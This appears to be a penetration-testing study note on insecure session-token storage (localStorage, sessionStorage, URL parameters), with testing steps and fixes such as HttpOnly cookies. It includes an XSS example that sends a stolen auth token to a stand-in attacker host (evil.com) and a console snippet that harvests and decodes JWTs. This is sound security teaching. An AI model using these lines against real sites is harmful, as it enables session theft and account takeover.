---
tags: [vapt, session-management, beginner]
difficulty: beginner
module: "17 - Session Management"
topic: "17.07 Insecure Session Storage (localStorage, URL params)"
---

# 17.07 — Insecure Session Storage

## Where Not to Store Session Tokens

```
BAD STORAGE LOCATIONS:
  1. URL query parameters
  2. localStorage
  3. sessionStorage
  4. Hidden form fields (embedded in every page)
  
GOOD STORAGE:
  HttpOnly cookie (preferred)
  Memory-only (JavaScript SPA — lost on refresh, but secure from XSS)
  
RISKS BY STORAGE TYPE:
  
  URL parameter:     → Logs, Referer, history, bookmarks, sharing
  localStorage:      → Accessible to ALL JavaScript (XSS = game over forever)
  sessionStorage:    → Accessible to ALL JavaScript (XSS = game over for tab)
  HttpOnly cookie:   → NOT accessible to JavaScript (XSS can't steal it)
```

---

## localStorage / sessionStorage Vulnerabilities

```javascript
// WHAT DEVELOPERS DO (WRONG for sensitive tokens):
localStorage.setItem('authToken', 'eyJhbGciOiJIUzI1NiIs...');  // BAD!
sessionStorage.setItem('session_id', 'abc123xyz');  // BAD!

// WHY IT'S BAD:
// Any JavaScript on the page can read it:
localStorage.getItem('authToken')  // returns the token!

// XSS + localStorage theft:
<script>
fetch('https://evil.com/?token=' + localStorage.getItem('authToken'))
</script>
// → Token stolen! HttpOnly would have prevented this.

// ALSO:
// localStorage persists FOREVER (until explicitly cleared)
// → Stolen token on shared computer → permanent access!
// sessionStorage persists until tab closes
// → Stolen → access until victim closes that specific tab

// LEGITIMATE USE OF localStorage (non-sensitive):
localStorage.setItem('theme', 'dark');      // OK - not sensitive
localStorage.setItem('language', 'en');     // OK - not sensitive
localStorage.setItem('cart_items', '...');  // OK - not auth
// NEVER: access tokens, session IDs, passwords, credit card data
```

---

## Session Token in URL

```
BAD PATTERN:
  GET /account?session=SECRET_TOKEN HTTP/1.1
  GET /api/data?token=eyJhbGciOiJIUzI... HTTP/1.1
  
  PROBLEMS:
  1. Logged in server access log:
     203.0.113.5 - GET /account?session=SECRET_TOKEN 200
     
  2. Appears in Referer header:
     User clicks external link from /account?session=SECRET
     → External site: Referer: https://target.com/account?session=SECRET
     
  3. Browser history:
     Everyone on shared computer can see it
     
  4. URL sharing:
     User copies link, shares in chat → session shared!
     
  5. Browser autocomplete / URL bar:
     Session visible in address bar while page loads

TESTING:
  Review all API calls in Burp HTTP History
  Look for: ?token=, ?session=, ?auth=, ?key=, ?access_token=
  Report as: "Session token transmitted in URL"
```

---

## Testing for Insecure Session Storage

```bash
# CHECK FOR TOKENS IN URLs:
# Burp HTTP History → filter "Params" → look for auth-related params in URL

# CHECK localStorage IN DEVTOOLS:
# DevTools → Application → Local Storage → target.com
# → Any keys that look like session tokens, JWTs, API keys?

# JWT IN localStorage DETECTION:
# In browser console:
for (let k in localStorage) {
    const v = localStorage.getItem(k);
    if (v && v.split('.').length === 3) {  // JWT = header.payload.signature
        console.log(`Found JWT in localStorage key: ${k}`);
        console.log(JSON.parse(atob(v.split('.')[1])));  // decode payload
    }
}

# CHECK sessionStorage SAME WAY:
# DevTools → Application → Session Storage

# LOOK FOR TOKEN IN HTML:
# Some apps embed session tokens in HTML for JavaScript to pick up:
curl https://target.com/dashboard | grep -i "token\|session\|auth"
```

---

## Fix

```
SECURE STORAGE:
  ✓ Store session IDs in HttpOnly cookies (not localStorage!)
  ✓ Set Secure flag (cookie only sent over HTTPS)
  ✓ Set SameSite=Lax or Strict
  
  EXAMPLE:
  Set-Cookie: session=RANDOM_TOKEN; HttpOnly; Secure; SameSite=Lax; Path=/
  
IF JWT MUST BE IN JavaScript (SPA):
  ✓ Use in-memory storage (not localStorage):
    // React: store token in component state or context
    // Cleared on page refresh — secure!
    
  ✓ If persistence needed: HttpOnly cookie is still better
    Let the server set a cookie, SPA reads from cookie automatically
    
  ✓ If localStorage absolutely required:
    Accept the XSS risk — mitigate with strong CSP
    Keep token lifetime very short (< 15 minutes)
    Require re-auth for sensitive operations
    
NEVER STORE IN URL:
  Use Authorization: Bearer header for APIs
  Use POST body for API authentication
  Never GET with token in query parameter
```

---

## Related Notes
- [[04 - Session Hijacking via Cookie Theft XSS]] — stealing localStorage via XSS
- [[11 - Cookie Flags Attack Scenarios]] — HttpOnly, Secure flags
- [[14 - Client-Side Session Tokens JWT Signed Cookies]] — JWT in cookies
- [[15 - Defense Secure Session Configuration]] — full hardening
